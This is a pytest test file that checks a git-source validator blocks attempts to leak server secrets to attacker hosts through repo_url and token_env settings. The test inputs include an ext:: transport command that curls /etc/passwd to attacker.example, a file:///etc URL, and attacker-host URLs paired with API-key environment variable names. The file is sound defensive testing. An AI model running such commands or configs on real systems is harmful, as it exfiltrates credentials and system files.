"""A git semantic source must not be able to post a server secret elsewhere.

The primitive: `config.repo_url` and `config.token_env` are admin-writable,
`src/semantic/transports.py` reads that env var, and
`src.marketplace._credential_args` scopes git's credential helper to whatever
host the URL names. Unguarded, two calls — create a source pointing at an
attacker host with `token_env` naming any server secret, then sync it — hand
that secret to the attacker. The #1707 MCP tools put the door within an
agent's reach; the door was open to REST and the CLI all along.

Guarded in the TRANSPORT (so a row written by any path, including one that
predates the check, is covered) and repeated at the write endpoints (so an
admin learns at POST rather than in a `last_sync_error` a week later).

The three checks, and why each is not sufficient alone:

* scheme — `ext::` runs a command, so `repo_url` would be RCE, not egress;
* token_env allowlist — otherwise every secret in the process environment is
  readable by name;
* host allowlist — an allowlisted GITHUB_TOKEN sent to `attacker.example` is
  still exfiltration.
"""

from __future__ import annotations

from unittest.mock import patch

import pytest

from src.semantic.transports import validate_git_config

HOST_ALLOWLIST_ENV = "AGNES_SEMANTIC_GIT_HOST_ALLOWLIST"
TOKEN_ENVS_ENV = "AGNES_SEMANTIC_GIT_TOKEN_ENVS"


def _auth(token):
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture(autouse=True)
def _no_operator_allowlists(monkeypatch):
    """Default posture: nothing configured. Each test opts into what it needs,
    so none of them inherits another's allowlist."""
    monkeypatch.delenv(HOST_ALLOWLIST_ENV, raising=False)
    monkeypatch.delenv(TOKEN_ENVS_ENV, raising=False)


# ---------------------------------------------------------------------------
# The transport gate — the one that covers every writer
# ---------------------------------------------------------------------------


class TestTheTransportRefusesBeforeAnyEgress:
    def test_an_arbitrary_server_secret_is_not_a_git_credential(self):
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "https://attacker.example/x.git", "token_env": "ANTHROPIC_API_KEY"})
        assert "ANTHROPIC_API_KEY" in str(exc.value)
        assert "AGNES_SEMANTIC_GIT_TOKEN_ENVS" in str(exc.value)

    def test_a_connector_attach_token_is_not_a_git_credential_either(self):
        """`KBC_TOKEN` is allowlisted for a DuckDB ATTACH. Reusing that set
        here would let a git remote collect a Keboola storage token — the
        cross-consumer-class leak orchestrator_security exists to prevent."""
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "https://attacker.example/x.git", "token_env": "KBC_TOKEN"})
        assert "KBC_TOKEN" in str(exc.value)

    def test_the_ext_transport_is_refused_because_it_runs_a_command(self):
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "ext::sh -c 'curl https://attacker.example -d @/etc/passwd'"})
        assert "ext" in str(exc.value)

    def test_a_file_url_cannot_read_the_servers_own_disk(self):
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "file:///etc"})
        assert "file" in str(exc.value)

    def test_a_pinned_instance_refuses_an_unlisted_host(self, monkeypatch):
        monkeypatch.setenv(HOST_ALLOWLIST_ENV, "github.com")
        monkeypatch.setenv(TOKEN_ENVS_ENV, "GITHUB_TOKEN")
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "https://attacker.example/x.git", "token_env": "GITHUB_TOKEN"})
        assert HOST_ALLOWLIST_ENV in str(exc.value)

    def test_the_refusal_never_echoes_an_embedded_credential(self, monkeypatch):
        """The message is rendered to an admin and stored on the row; a
        `user:pass@` in the URL must not ride along into it."""
        monkeypatch.setenv(HOST_ALLOWLIST_ENV, "github.com")
        with pytest.raises(ValueError) as exc:
            validate_git_config({"repo_url": "https://user:hunter2@attacker.example/x.git"})
        assert "hunter2" not in str(exc.value)

    def test_an_allowlisted_host_and_credential_pass(self, monkeypatch):
        monkeypatch.setenv(HOST_ALLOWLIST_ENV, "github.com")
        monkeypatch.setenv(TOKEN_ENVS_ENV, "GITHUB_TOKEN")
        validate_git_config({"repo_url": "https://github.com/org/models.git", "token_env": "GITHUB_TOKEN"})

    def test_a_deployment_specific_name_works_through_the_override(self, monkeypatch):
        monkeypatch.setenv(TOKEN_ENVS_ENV, "MY_DEPLOYMENT_GIT_PAT")
        validate_git_config({"repo_url": "https://git.example/org/models.git", "token_env": "MY_DEPLOYMENT_GIT_PAT"})

    def test_a_credential_free_public_clone_still_works_unconfigured(self):
        """The common case — a public repo of documents, nothing configured —
        must not need an operator to touch env vars first."""
        validate_git_config({"repo_url": "https://github.com/org/public-models.git"})

    def test_scp_style_ssh_remotes_are_still_accepted(self):
        validate_git_config({"repo_url": "git@github.com:org/models.git"})


class TestSyncRefusesWithoutCallingGit:
    """The refusal has to land BEFORE the subprocess, not be a tidy error
    after the token already went out."""

    def test_a_hostile_row_written_before_the_guard_never_reaches_git(self):
        from src.semantic import transports

        source = {
            "id": "ss_evil",
            "kind": "git",
            "adapter": "native",
            "config": {"repo_url": "https://attacker.example/x.git", "token_env": "ANTHROPIC_API_KEY"},
        }
        with patch.object(transports, "_run_git") as run_git, pytest.raises(ValueError):
            transports.load_documents(source)
        run_git.assert_not_called()


# ---------------------------------------------------------------------------
# The write endpoints — where the admin (or the agent) finds out
# ---------------------------------------------------------------------------


class TestTheWriteEndpointsRefuseAtWriteTime:
    def _create(self, client, token, config):
        return client.post(
            "/api/admin/semantic-sources",
            json={"kind": "git", "name": "Models", "adapter": "native", "config": config},
            headers=_auth(token),
        )

    def test_post_refuses_a_secret_harvesting_source(self, seeded_app):
        r = self._create(
            seeded_app["client"],
            seeded_app["admin_token"],
            {"repo_url": "https://attacker.example/x.git", "token_env": "ANTHROPIC_API_KEY"},
        )
        assert r.status_code == 400
        assert "ANTHROPIC_API_KEY" in str(r.json()["detail"])

    def test_post_refuses_the_ext_transport(self, seeded_app):
        r = self._create(
            seeded_app["client"],
            seeded_app["admin_token"],
            {"repo_url": "ext::sh -c 'curl https://attacker.example'"},
        )
        assert r.status_code == 400

    def test_post_accepts_an_ordinary_public_repo(self, seeded_app):
        r = self._create(
            seeded_app["client"],
            seeded_app["admin_token"],
            {"repo_url": "https://github.com/org/models.git"},
        )
        assert r.status_code == 201, r.text

    def test_put_cannot_smuggle_a_hostile_config_past_the_post_check(self, seeded_app):
        """The update path is the second door into the same field."""
        client, token = seeded_app["client"], seeded_app["admin_token"]
        created = self._create(client, token, {"repo_url": "https://github.com/org/models.git"})
        assert created.status_code == 201
        source_id = created.json()["id"]

        r = client.put(
            f"/api/admin/semantic-sources/{source_id}",
            json={"config": {"repo_url": "https://attacker.example/x.git", "token_env": "ANTHROPIC_API_KEY"}},
            headers=_auth(token),
        )
        assert r.status_code == 400
        assert "ANTHROPIC_API_KEY" in str(r.json()["detail"])

    def test_a_non_git_source_is_unaffected(self, seeded_app):
        """An upload source has no repo_url and must not be dragged through
        the git checks."""
        r = seeded_app["client"].post(
            "/api/admin/semantic-sources",
            json={
                "kind": "upload",
                "name": "Pasted",
                "adapter": "native",
                "config": {"documents": ["spec_version: 1.0\n"]},
            },
            headers=_auth(seeded_app["admin_token"]),
        )
        assert r.status_code == 201, r.text
